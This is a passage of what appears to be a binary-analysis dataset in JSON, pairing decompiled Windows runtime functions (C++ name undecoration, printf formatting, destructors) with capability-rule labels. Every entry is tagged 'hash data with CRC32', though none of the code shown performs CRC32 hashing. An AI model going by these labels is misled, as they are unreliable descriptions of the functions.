fcn.004068e3(uVar3);\n            }\n            else {\n                var_70h = 0x48a528;\n                fcn.00403936(&fcn.00403152::var_1ch);\n                ppcVar4 = fcn.004052f9(&fcn.00403152::var_44h, &fcn.00403152::var_44h);\n                var_10h = *ppcVar4;\n                var_ch = ppcVar4[1];\n            }\n            if (*arg_ch != NULL) {\n                if ((var_10h == NULL) || ((*0x56f460 & 0x1000) != 0)) {\n                    var_ch = arg_ch[1];\n                    var_10h = *arg_ch;\n                }\n                else {\n                    var_70h = arg_ch;\n                    var_78h = &fcn.00403152::var_1ch;\n                    uVar3 = fcn.00402e87(var_78h, 0x20, arg_ch);\n                    fcn.00402eb9(uVar3);\n                }\n            }\n            var_40h = NULL;\n            var_18h = NULL;\n            if (var_58h == 0) {\n                var_70h = 0x8;\n                ppcVar4 = fcn.004051dc(8);\n                if (ppcVar4 != NULL) {\n                    *ppcVar4 = NULL;\n                    ppcVar4[1] = NULL;\n                    ppcVar9 = ppcVar4;\n                }\n                var_78h = &fcn.00403152::var_68h;\n                ppcVar4 = fcn.00404165(var_78h, ppcVar9);\n                var_40h = *ppcVar4;\n                var_18h = ppcVar4[1];\n            }\n            else {\n                var_70h = NULL;\n                var_78h = 0x48a5a6;\n                var_78h = fcn.00404165(&fcn.00403152::var_5ch, 0);\n                var_80h = &fcn.00403152::var_68h;\n                var_70h = fcn.00402e87(var_80h, 0x20, var_78h);\n                fcn.00402eb9(var_70h);\n                if ((*0x56f460 & 0x1000) != 0) goto code_r0x0048ae53;\n            }\n            if (var_20h == 0x800) {\n                uVar2 = uVar1 & 0x400;\n            }\n            else {\n                uVar2 = uVar1 & 0x1000;\n            }\n            if (uVar2 != 0) {\n                if (var_20h == 0x800) {\n                    if (uVar8 == 0x600) {\n                        var_5ch = \"`vtordispex{\";\n                        var_58h = 0xc;\n                        var_78h = 0x48a64b;\n                        fcn.00402cfc(&fcn.00403152::var_5ch);\n                        var_78h = &fcn.00403152::var_34h;\n                        var_80h = 0x48a65a;\n                        fcn.004052f9(&fcn.00403152::var_5ch, var_78h);\n                        var_80h = 0x2c;\n                        puVar6 = &fcn.00403152::var_80h;\n                        var_88h = 0x48a668;\n                        fcn.004032bf(puVar6, 0x2c);\n                        var_88h = &fcn.00403152::var_8h;\n                        fcn.004052f9(&fcn.00403152::var_88h, var_88h);\n                        fcn.004032bf(&fcn.00403152::var_78h, 0x2c);\n                        fcn.004052f9(&fcn.00403152::var_70h, &fcn.00403152::var_54h);\n                    }\n                    else {\n                        if (uVar8 != 0x500) goto code_r0x0048a6ee;\n                        var_8h = \"`vtordisp{\";\n                        var_4h = 0xa;\n                        var_78h = 0x48a6c6;\n                        fcn.00402cfc(&fcn.00403152::var_8h);\n                        var_78h = &fcn.00403152::var_54h;\n                        var_80h = 0x48a6d5;\n                        fcn.004052f9(&fcn.00403152::var_8h, var_78h);\n                        var_80h = 0x2c;\n                        puVar6 = &fcn.00403152::var_70h;\n                    }\n                    var_88h = 0x48a6e3;\n                    uVar3 = fcn.004032bf(puVar6, var_80h);\n                    fcn.00402eb9(uVar3);\n                }\n                else {\ncode_r0x0048a6ee:\n                    var_8h = \"`adjustor{\";\n                    var_4h = 0xa;\n                    var_78h = 0x48a708;\n                    fcn.00405c95(&fcn.00403152::var_8h);\n                }\n                var_8h = var_38h;\n                var_4h = var_14h;\n                var_78h = &fcn.00403152::var_34h;\n                var_34h = 0x54f4ac;\n                var_30h = 0x3;\n                fcn.00405c95(var_78h);\n                var_80h = 0x48a73a;\n                fcn.00402eb9(&fcn.00403152::var_8h);\n            }\n            if ((*0x56f470 == 1) && (*0x56f46c == 0)) {\n                *0x56f46c = var_60h;\n            }\n            var_80h = &fcn.00403152::var_2ch;\n            uVar3 = fcn.00406785(var_80h);\n            var_88h = 0x28;\n            fcn.00402e87(&fcn.00403152::var_70h, 0x28, uVar3);\n            var_80h = 0x29;\n            var_88h = 0x48a779;\n            fcn.004032bf(&fcn.00403152::var_78h, 0x29);\n            fcn.00402eb9(0x48a782);\n            if ((var_20h == 0x800) && ((uVar1 & 0x700) != 0x200)) {\n                fcn.00402eb9(&fcn.00403152::var_4ch);\n            }\n            if ((~(*0x56f460 >> 0x13) & 1) == 0) {\n                uVar3 = fcn.00402315(&fcn.00403152::var_2ch);\n                fcn.004068e3(uVar3);\n            }\n            else {\n                uVar3 = fcn.00402315(&fcn.00403152::var_2ch);\n                fcn.00402eb9(uVar3);\n            }\n            uVar3 = fcn.00401dca(&fcn.00403152::var_2ch);\n            fcn.00402eb9(uVar3);\n            if ((~(*0x56f460 >> 8) & 1) == 0) {\n                uVar3 = fcn.004059d9(&fcn.00403152::var_2ch);\n                fcn.004068e3(uVar3);\n            }\n            else {\n                uVar3 = fcn.004059d9(&fcn.00403152::var_2ch);\n                fcn.00402eb9(uVar3);\n            }\n            uVar3 = fcn.00404516(&fcn.00403152::var_2ch);\n            fcn.004068e3(uVar3);\n            uVar2 = var_24h;\n            if (((~(*0x56f460 >> 2) & 1) != 0) && (ppcVar9 != NULL)) {\n                *ppcVar9 = var_10h;\n                ppcVar9[1] = var_ch;\n                var_10h = var_40h;\n                var_ch = var_18h;\n            }\n        }\n        else {\n            var_70h = &fcn.00403152::var_34h;\n            fcn.004032bf(var_70h, 0x7b);\n            var_78h = &fcn.00403152::var_8h;\n            fcn.00403535(var_78h, 0);\n            var_78h = &fcn.00403152::var_4ch;\n            uVar3 = fcn.004052f9(var_78h, &fcn.00403152::var_8h);\n            var_80h = 0x48a31b;\n            fcn.00402eb9(uVar3);\n            var_80h = &fcn.00403152::var_34h;\n            fcn.00403c0b(var_80h);\n            if ((*0x56f460 & 0x1000) == 0) {\n                var_80h = &fcn.00403152::var_34h;\n                var_8h = 0x54f4ac;\n                var_88h = &fcn.00403152::var_4ch;\n                var_4h = 0x3;\n                fcn.00402e87(var_88h, 0x2c, var_80h);\n                var_80h = &fcn.00403152::var_8h;\n                var_88h = 0x48a361;\n                var_88h = fcn.004050ba(&fcn.00403152::var_54h, var_80h);\n                fcn.00402eb9(var_88h);\n            }\n            var_8h = 0x54f4b0;\n            var_4h = 0x2;\n            fcn.00405c95(&fcn.00403152::var_8h);\n            fcn.00403936(&fcn.00403152::var_8h);\n            uVar2 = var_24h;\n            if ((((~(*0x56f460 >> 1) & 1) != 0) && ((~(*0x56f460 >> 4) & 1) != 0)) && ((*0x56f460 & 0x1000) == 0)) {\n                fcn.00402e87(&fcn.00403152::var_34h, 0x20, &fcn.00403152::var_8h);\n                fcn.004032bf(&fcn.00403152::var_4ch, 0x20);\n                ppcVar9 = fcn.004052f9(&fcn.00403152::var_54h, &fcn.00403152::var_10h);\n                var_10h = *ppcVar9;\n                var_ch = ppcVar9[1];\n                uVar2 = var_24h;\n            }\n        }\ncode_r0x0048aae5:\n        bVar10 = (uVar1 & 0x1800) == 0x800;\n    }\n    uVar8 = uVar1 & 0x1800;\n    var_14h = uVar1 & 0x6000;\n    if (bVar10) {\n        if ((~(*0x56f460 >> 9) & 1) != 0) {\n            if (uVar2 == 0) {\n                bVar10 = var_14h == NULL;\n            }\n            else {\n                bVar10 = uVar8 == 0x800;\n            }\n            if (bVar10) {\n                if ((uVar2 == 0) || ((uVar1 & 0x700) == 0x200)) {\n                    var_8h = \"static \";\n                    var_4h = 0x7;\n                    fcn.00402cfc(&fcn.00403152::var_8h);\n                    fcn.004052f9(&fcn.00403152::var_8h, &fcn.00403152::var_10h);\n                    var_10h = var_8h;\n                    var_ch = var_4h;\n                    goto code_r0x0048ab93;\n                }\ncode_r0x0048ab97:\n                if ((uVar1 & 0x700) != 0x100) {\n                    bVar10 = uVar8 == 0x800;\n                    goto code_r0x0048abbd;\n                }\n            }\n            else {\ncode_r0x0048ab93:\n                if (uVar2 != 0) goto code_r0x0048ab97;\n                bVar10 = var_14h == NULL;\ncode_r0x0048abbd:\n                if (bVar10) {\n                    uVar7 = uVar1 & 0x400;\n                }\n                else {\n                    uVar7 = uVar1 & 0x1000;\n                }\n                if (uVar7 == 0) goto code_r0x0048ac9f;\n                if (uVar2 == 0) {\n                    bVar10 = var_14h == NULL;\n                    var_18h = var_14h;\n                }\n                else {\n                    bVar10 = uVar8 == 0x800;\n                    var_18h = uVar1 & 0x6000;\n                }\n                if ((!bVar10) || ((uVar1 & 0x700) != 0x500)) {\n                    if (uVar2 == 0) {\n                        uVar7 = uVar1 & 0x6000;\n                    }\n                    else {\n                        uVar7 = (uVar1 & 0x1800) - 0x800;\n                    }\n                    if ((uVar7 != 0) || ((uVar1 & 0x700) != 0x600)) {\n                        if (uVar2 == 0) {\n                            bVar10 = var_18h == NULL;\n                        }\n                        else {\n                            bVar10 = (uVar1 & 0x1800) == 0x800;\n                        }\n                        if ((!bVar10) || ((uVar1 & 0x700) != 0x400)) goto code_r0x0048ac9f;\n                    }\n                }\n            }\n            var_8h = \"virtual \";\n            var_4h = 0x8;\n            fcn.00402cfc(&fcn.00403152::var_8h);\n            fcn.004052f9(&fcn.00403152::var_8h, &fcn.00403152::var_10h);\n            var_10h = var_8h;\n            var_ch = var_4h;\n        }\ncode_r0x0048ac9f:\n        if ((~(*0x56f460 >> 7) & 1) != 0) {\n            if (uVar2 == 0) {\n                bVar10 = var_14h == NULL;\n            }\n            else {\n                bVar10 = uVar8 == 0x800;\n            }\n            if (bVar10) {\n                if (uVar2 == 0) {\n                    bVar10 = uVar8 == 0x800;\n                }\n                else {\n                    bVar10 = (uVar1 & 0xc0) == 0x40;\n                }\n                if (!bVar10) goto code_r0x0048acf9;\n                var_8h = \"private: \";\n                var_4h = 0x9;\ncode_r0x0048ad84:\n                fcn.00402cfc(&fcn.00403152::var_8h);\n                fcn.004052f9(&fcn.00403152::var_8h, &fcn.00403152::var_10h);\n                var_10h = var_8h;\n                var_ch = var_4h;\n            }\n            else {\ncode_r0x0048acf9:\n                if (uVar2 == 0) {\n                    bVar10 = var_14h == NULL;\n                }\n                else {\n                    bVar10 = uVar8 == 0x800;\n                }\n                if (bVar10) {\n                    if (uVar2 == 0) {\n                        bVar10 = uVar8 == 0x1000;\n                    }\n                    else {\n                        bVar10 = (uVar1 & 0xc0) == 0x80;\n                    }\n                    if (bVar10) {\n                        var_8h = \"protected: \";\n                        var_4h = 0xb;\n                        goto code_r0x0048ad84;\n                    }\n                }\n                if (uVar2 == 0) {\n                    bVar10 = var_14h == NULL;\n                }\n                else {\n                    bVar10 = uVar8 == 0x800;\n                }\n                uVar7 = uVar1 & 0x1800;\n                if (bVar10) {\n                    if (uVar2 != 0) {\n                        uVar7 = uVar1 & 0xc0;\n                    }\n                    if (uVar7 == 0) {\n                        var_8h = \"public: \";\n                        var_4h = 0x8;\n                        goto code_r0x0048ad84;\n                    }\n                }\n            }\n        }\n    }\n    if (uVar2 == 0) {\n        bVar10 = var_14h == NULL;\n    }\n    else {\n        bVar10 = uVar8 == 0x800;\n    }\n    if (bVar10) {\n        uVar8 = uVar1 & 0x400;\n    }\n    else {\n        uVar8 = uVar1 & 0x1000;\n    }\n    if ((uVar8 != 0) && ((*0x56f460 & 0x1000) == 0)) {\n        var_8h = \"[thunk]:\";\n        var_4h = 0x8;\n        fcn.00402cfc(&fcn.00403152::var_8h);\n        fcn.004052f9(&fcn.00403152::var_8h, &fcn.00403152::var_10h);\n        var_10h = var_8h;\n        var_ch = var_4h;\n    }\n    if ((uVar1 & 0x10000) != 0) {\n        var_8h = \"extern \\\"C\\\" \";\n        var_4h = 0xb;\n        fcn.00402cfc(&fcn.00403152::var_8h);\n        fcn.004052f9(&fcn.00403152::var_8h, &fcn.00403152::var_10h);\n        var_10h = var_8h;\n        var_ch = var_4h;\n    }\ncode_r0x0048ae53:\n    *arg_8h = var_10h;\n    arg_8h[1] = var_ch;\n    return arg_8h;\n}\n",
        "token_count": 7474
    },
    "004031a2": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004031a2(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint uVar4;\n    \n    if ((-1 < arg_8h) && (arg_8h < *0x570488)) {\n        iVar3 = (arg_8h & 0x3f) * 0x38;\n        iVar1 = *((arg_8h >> 6) * 4 + 0x570220);\n        if (((*(iVar3 + 0x28 + iVar1) & 1) != 0) && (*(iVar3 + 0x18 + iVar1) != -1)) {\n            iVar1 = fcn.0040199c();\n            if (iVar1 == 1) {\n                if (arg_8h == 0) {\n                    uVar4 = 0xfffffff6;\n                }\n                else if (arg_8h == 1) {\n                    uVar4 = 0xfffffff5;\n                }\n                else {\n                    if (arg_8h != 2) goto code_r0x004ca159;\n                    uVar4 = 0xfffffff4;\n                }\n                (*_sym.imp.KERNEL32.dll_SetStdHandle)(uVar4, 0);\n            }\ncode_r0x004ca159:\n            *(iVar3 + 0x18 + *((arg_8h >> 6) * 4 + 0x570220)) = 0xffffffff;\n            return 0;\n        }\n    }\n    puVar2 = fcn.004039a4();\n    *puVar2 = 9;\n    puVar2 = fcn.0040185c();\n    *puVar2 = 0;\n    return 0xffffffff;\n}\n",
        "token_count": 392
    },
    "0047e0bf": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0047e0bf(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.std::_Mpunct_char_.0;\n    fcn.004029a5();\n    *in_ECX = vtable.std::_Facet_base.0;\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a32(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 104
    },
    "0047e1a3": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0047e1a3(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.std::_Mpunct_char_.0;\n    fcn.004029a5();\n    *in_ECX = vtable.std::_Facet_base.0;\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a32(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 105
    },
    "00406343": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.00406343(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint arg_30h)\n\n{\n    int32_t *arg_14h;\n    uint32_t uVar1;\n    bool bVar2;\n    bool bVar3;\n    char cVar4;\n    uchar uVar5;\n    int32_t in_ECX;\n    int32_t arg_ch;\n    int32_t arg_10h;\n    uint arg_8h;\n    uint arg_ch_00;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    cVar4 = *(in_ECX + 0x31);\n    var_4h = in_ECX;\n    if (cVar4 < 'e') {\n        if (cVar4 == 'd') {\ncode_r0x0049ea95:\n            *(in_ECX + 0x20) = *(in_ECX + 0x20) | 0x10;\ncode_r0x0049ea99:\n            arg_ch_00 = 0;\n            arg_8h = 10;\ncode_r0x0049ea9c:\n            cVar4 = fcn.00405880(arg_8h, arg_ch_00);\n        }\n        else if (cVar4 < 'Y') {\n            if (cVar4 == 'X') {\n                arg_ch_00 = 1;\ncode_r0x0049ea41:\n                arg_8h = 0x10;\n                goto code_r0x0049ea9c;\n            }\n            if (cVar4 != 'A') {\n                if (cVar4 == 'C') goto code_r0x0049ea55;\n                if (cVar4 < 'E') {\n                    return 0;\n                }\n                if ('G' < cVar4) {\n                    if (cVar4 != 'S') {\n                        return 0;\n                    }\n                    goto code_r0x0049ea29;\n                }\n            }\ncode_r0x0049eaa5:\n            cVar4 = fcn.00403b11();\n        }\n        else if (cVar4 == 'Z') {\n            cVar4 = fcn.00404ead();\n        }\n        else {\n            if (cVar4 == 'a') goto code_r0x0049eaa5;\n            if (cVar4 != 'c') {\n                return 0;\n            }\ncode_r0x0049ea55:\n            cVar4 = fcn.004040e3(0);\n        }\n    }\n    else if (cVar4 < 'q') {\n        if (cVar4 == 'p') {\n            cVar4 = fcn.004043f9();\n        }\n        else {\n            if (cVar4 < 'h') goto code_r0x0049eaa5;\n            if (cVar4 == 'i') goto code_r0x0049ea95;\n            if (cVar4 == 'n') {\n                cVar4 = fcn.00402c9d();\n            }\n            else {\n                if (cVar4 != 'o') {\n                    return 0;\n                }\n                cVar4 = fcn.004015a0();\n            }\n        }\n    }\n    else {\n        if (cVar4 != 's') {\n            if (cVar4 != 'u') {\n                if (cVar4 != 'x') {\n                    return 0;\n                }\n                arg_ch_00 = 0;\n                goto code_r0x0049ea41;\n            }\n            goto code_r0x0049ea99;\n        }\ncode_r0x0049ea29:\n        cVar4 = fcn.00403611();\n    }\n    if (cVar4 == '\\0') {\n        return 0;\n    }\n    if (*(in_ECX + 0x30) != '\\0') {\n        return 1;\n    }\n    arg_ch = 0;\n    var_4h = var_4h._3_1_ << 0x18;\n    uVar1 = *(in_ECX + 0x20);\n    var_8h = 0;\n    if ((uVar1 >> 4 & 1) != 0) {\n        if ((uVar1 >> 6 & 1) == 0) {\n            if ((uVar1 & 1) == 0) {\n                if ((uVar1 >> 1 & 1) != 0) {\n                    var_4h = CONCAT31(var_4h._1_3_, 0x20);\n                    arg_ch = 1;\n                    var_8h = 1;\n                }\n                goto code_r0x0049eb2b;\n            }\n            var_4h = CONCAT31(var_4h._1_3_, 0x2b);\n        }\n        else {\n            var_4h = CONCAT31(var_4h._1_3_, 0x2d);\n        }\n        var_8h = 1;\n        arg_ch = 1;\n    }\ncode_r0x0049eb2b:\n    cVar4 = *(in_ECX + 0x31);\n    if (((cVar4 == 'x') || (cVar4 == 'X')) && ((uVar1 >> 5 & 1) != 0)) {\n        bVar2 = true;\n    }\n    else {\n        bVar2 = false;\n    }\n    if ((cVar4 == 'a') || (cVar4 == 'A')) {\n        bVar3 = true;\n    }\n    else {\n        bVar3 = false;\n    }\n    if ((bVar2) || (bVar3)) {\n        *(&var_4h + arg_ch) = 0x30;\n        if ((cVar4 == 'X') || (cVar4 == 'A')) {\n            uVar5 = 0x58;\n        }\n        else {\n            uVar5 = 0x78;\n        }\n        *(&var_4h + arg_ch + 1) = uVar5;\n        arg_ch = arg_ch + 2;\n        var_8h = arg_ch;\n    }\n    arg_14h = in_ECX + 0x18;\n    arg_10h = (*(in_ECX + 0x24) - *(in_ECX + 0x38)) - arg_ch;\n    if ((*(in_ECX + 0x20) & 0xc) == 0) {\n        fcn.00403f9e(in_ECX + 0x448, 0x20, arg_10h, arg_14h);\n        arg_ch = var_8h;\n    }\n    fcn.004053da(&var_4h, arg_ch, arg_14h);\n    if (((*(in_ECX + 0x20) >> 3 & 1) != 0) && ((*(in_ECX + 0x20) >> 2 & 1) == 0)) {\n        fcn.00403f9e(in_ECX + 0x448, 0x30, arg_10h, arg_14h);\n    }\n    fcn.0040547a(0);\n    if ((-1 < *arg_14h) && ((*(in_ECX + 0x20) >> 2 & 1) != 0)) {\n        fcn.00403f9e(in_ECX + 0x448, 0x20, arg_10h, arg_14h);\n    }\n    return 1;\n}\n",
        "token_count": 1686
    },
    "0046bb41": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046bb41(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.std::_Facet_base.0;\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a32(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 78
    },
    "0046bbd0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046bbd0(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.std::_Mpunct_unsigned_short_int_.0;\n    fcn.004043b3();\n    *in_ECX = vtable.std::_Facet_base.0;\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a32(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 106
    },
    "00403468": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403468(uint *arg_8h)\n\n{\n    uint32_t *puVar1;\n    \n    puVar1 = arg_8h + 3;\n    if (((*puVar1 >> 0xd & 1) != 0) && ((*puVar1 >> 6 & 1) != 0)) {\n        fcn.00406302(arg_8h[1]);\n        LOCK();\n        *puVar1 = *puVar1 & 0xfffffebf;\n        arg_8h[1] = 0;\n        *arg_8h = 0;\n        arg_8h[2] = 0;\n    }\n    return;\n}\n",
        "token_count": 151
    },
    "00462303": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00462303(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.std::exception.0;\n    fcn.00405a60(in_ECX + 1);\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a32(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 90
    },
    "0040354e": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0040354e(int32_t param_1)\n\n{\n    int32_t arg_8h;\n    int16_t iVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    bool bVar4;\n    char cVar5;\n    int32_t arg_ch;\n    int32_t arg_10h;\n    uint unaff_ESI;\n    ushort uVar6;\n    uint16_t uVar7;\n    uint arg_8h_00;\n    uint arg_ch_00;\n    uint var_14h;\n    int32_t var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    uVar7 = *(param_1 + 0x32);\n    if (uVar7 < 0x65) {\n        if (uVar7 == 100) {\ncode_r0x0049fbde:\n            *(param_1 + 0x20) = *(param_1 + 0x20) | 0x10;\ncode_r0x0049fbe2:\n            arg_ch_00 = 0;\n            arg_8h_00 = 10;\ncode_r0x0049fbe5:\n            cVar5 = fcn.00402306(arg_8h_00, arg_ch_00);\n        }\n        else if (uVar7 < 0x59) {\n            if (uVar7 == 0x58) {\n                arg_ch_00 = 1;\ncode_r0x0049fb8a:\n                arg_8h_00 = 0x10;\n                goto code_r0x0049fbe5;\n            }\n            if (uVar7 != 0x41) {\n                if (uVar7 == 0x43) goto code_r0x0049fb9e;\n                if (uVar7 < 0x45) goto code_r0x0049fd6e;\n                if (0x47 < uVar7) {\n                    if (uVar7 != 0x53) goto code_r0x0049fd6e;\n                    goto code_r0x0049fb72;\n                }\n            }\ncode_r0x0049fbee:\n            cVar5 = fcn.00404fed();\n        }\n        else if (uVar7 == 0x5a) {\n            cVar5 = fcn.004068d9();\n        }\n        else {\n            if (uVar7 == 0x61) goto code_r0x0049fbee;\n            if (uVar7 != 99) goto code_r0x0049fd6e;\ncode_r0x0049fb9e:\n            cVar5 = fcn.00404007(0);\n        }\n    }\n    else if (uVar7 < 0x71) {\n        if (uVar7 == 0x70) {\n            cVar5 = fcn.00401b9a();\n        }\n        else {\n            if (uVar7 < 0x68) goto code_r0x0049fbee;\n            if (uVar7 == 0x69) goto code_r0x0049fbde;\n            if (uVar7 == 0x6e) {\n                cVar5 = fcn.00404426();\n            }\n            else {\n                if (uVar7 != 0x6f) goto code_r0x0049fd6e;\n                cVar5 = fcn.00402202();\n            }\n        }\n    }\n    else {\n        if (uVar7 != 0x73) {\n            if (uVar7 != 0x75) {\n                if (uVar7 != 0x78) goto code_r0x0049fd6e;\n                arg_ch_00 = 0;\n                goto code_r0x0049fb8a;\n            }\n            goto code_r0x0049fbe2;\n        }\ncode_r0x0049fb72:\n        cVar5 = fcn.00402248();\n    }\n    if ((cVar5 == '\\0') || (*(param_1 + 0x30) != '\\0')) goto code_r0x0049fd6e;\n    arg_ch = 0;\n    var_ch = 0;\n    var_8h._0_2_ = 0;\n    uVar2 = *(param_1 + 0x20);\n    var_10h = 0;\n    if ((uVar2 >> 4 & 1) != 0) {\n        if ((uVar2 >> 6 & 1) == 0) {\n            if ((uVar2 & 1) == 0) {\n                if ((uVar2 >> 1 & 1) != 0) {\n                    var_ch = 0x20;\n                    arg_ch = 1;\n                    var_10h = 1;\n                }\n                goto code_r0x0049fc79;\n            }\n            uVar7 = 0x2b;\n        }\n        else {\n            uVar7 = 0x2d;\n        }\n        var_ch = uVar7;\n        var_10h = 1;\n        arg_ch = 1;\n    }\ncode_r0x0049fc79:\n    iVar1 = *(param_1 + 0x32);\n    if (((iVar1 == 0x78) || (iVar1 == 0x58)) && ((uVar2 >> 5 & 1) != 0)) {\n        bVar3 = true;\n    }\n    else {\n        bVar3 = false;\n    }\n    if ((iVar1 == 0x61) || (iVar1 == 0x41)) {\n        bVar4 = true;\n    }\n    else {\n        bVar4 = false;\n    }\n    if ((bVar3) || (bVar4)) {\n        *(&var_ch + arg_ch * 2) = 0x30;\n        if ((iVar1 == 0x58) || (uVar6 = 0x78,  iVar1 == 0x41)) {\n            uVar6 = 0x58;\n        }\n        *(&var_ch + arg_ch * 2 + 2) = uVar6;\n        arg_ch = arg_ch + 2;\n        var_10h = arg_ch;\n    }\n    arg_8h = param_1 + 0x448;\n    arg_10h = (*(param_1 + 0x24) - *(param_1 + 0x38)) - arg_ch;\n    if ((*(param_1 + 0x20) & 0xc) == 0) {\n        fcn.00403f2b(arg_8h, 0x20, arg_10h, param_1 + 0x18);\n        arg_ch = var_10h;\n    }\n    fcn.00402937(&var_ch, arg_ch, param_1 + 0x18);\n    if (((*(param_1 + 0x20) >> 3 & 1) != 0) && ((*(param_1 + 0x20) >> 2 & 1) == 0)) {\n        fcn.00403f2b(arg_8h, 0x30, arg_10h, param_1 + 0x18);\n    }\n    fcn.0040134d(0);\n    if ((-1 < *(param_1 + 0x18)) && ((*(param_1 + 0x20) >> 2 & 1) != 0)) {\n        fcn.00403f2b(arg_8h, 0x20, arg_10h, param_1 + 0x18);\n    }\ncode_r0x0049fd6e:\n    fcn.00403085(unaff_ESI);\n    return;\n}\n",
        "token_count": 1729
    },
    "00403576": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.00403576(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint arg_30h)\n\n{\n    int32_t *arg_14h;\n    uint32_t uVar1;\n    bool bVar2;\n    bool bVar3;\n    char cVar4;\n    uchar uVar5;\n    int32_t in_ECX;\n    int32_t arg_ch;\n    int32_t arg_10h;\n    uint arg_8h;\n    uint arg_ch_00;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    cVar4 = *(in_ECX + 0x31);\n    var_4h = in_ECX;\n    if (cVar4 < 'e') {\n        if (cVar4 == 'd') {\ncode_r0x0049e506:\n            *(in_ECX + 0x20) = *(in_ECX + 0x20) | 0x10;\ncode_r0x0049e50a:\n            arg_ch_00 = 0;\n            arg_8h = 10;\ncode_r0x0049e50d:\n            cVar4 = fcn.00403760(arg_8h, arg_ch_00);\n        }\n        else if (cVar4 < 'Y') {\n            if (cVar4 == 'X') {\n                arg_ch_00 = 1;\ncode_r0x0049e4b2:\n                arg_8h = 0x10;\n                goto code_r0x0049e50d;\n            }\n            if (cVar4 != 'A') {\n                if (cVar4 == 'C') goto code_r0x0049e4c6;\n                if (cVar4 < 'E') {\n                    return 0;\n                }\n                if ('G' < cVar4) {\n                    if (cVar4 != 'S') {\n                        return 0;\n                    }\n                    goto code_r0x0049e49a;\n                }\n            }\ncode_r0x0049e516:\n            cVar4 = fcn.004014d3();\n        }\n        else if (cVar4 == 'Z') {\n            cVar4 = fcn.00405e66();\n        }\n        else {\n            if (cVar4 == 'a') goto code_r0x0049e516;\n            if (cVar4 != 'c') {\n                return 0;\n            }\ncode_r0x0049e4c6:\n            cVar4 = fcn.00405222(0);\n        }\n    }\n    else if (cVar4 < 'q') {\n        if (cVar4 == 'p') {\n            cVar4 = fcn.004060e1();\n        }\n        else {\n            if (cVar4 < 'h') goto code_r0x0049e516;\n            if (cVar4 == 'i') goto code_r0x0049e506;\n            if (cVar4 == 'n') {\n                cVar4 = fcn.00406523();\n            }\n            else {\n                if (cVar4 != 'o') {\n                    return 0;\n                }\n                cVar4 = fcn.00403e13();\n            }\n        }\n    }\n    else {\n        if (cVar4 != 's') {\n            if (cVar4 != 'u') {\n                if (cVar4 != 'x') {\n                    return 0;\n                }\n                arg_ch_00 = 0;\n                goto code_r0x0049e4b2;\n            }\n            goto code_r0x0049e50a;\n        }\ncode_r0x0049e49a:\n        cVar4 = fcn.004020d1();\n    }\n    if (cVar4 == '\\0') {\n        return 0;\n    }\n    cVar4 = fcn.00403094();\n    if (cVar4 != '\\0') {\n        return 1;\n    }\n    if (*(in_ECX + 0x30) != '\\0') {\n        return 1;\n    }\n    arg_ch = 0;\n    var_4h = var_4h._3_1_ << 0x18;\n    uVar1 = *(in_ECX + 0x20);\n    var_8h = 0;\n    if ((uVar1 >> 4 & 1) != 0) {\n        if ((uVar1 >> 6 & 1) == 0) {\n            if ((uVar1 & 1) == 0) {\n                if ((uVar1 >> 1 & 1) != 0) {\n                    var_4h = CONCAT31(var_4h._1_3_, 0x20);\n                    arg_ch = 1;\n                    var_8h = 1;\n                }\n                goto code_r0x0049e5ab;\n            }\n            var_4h = 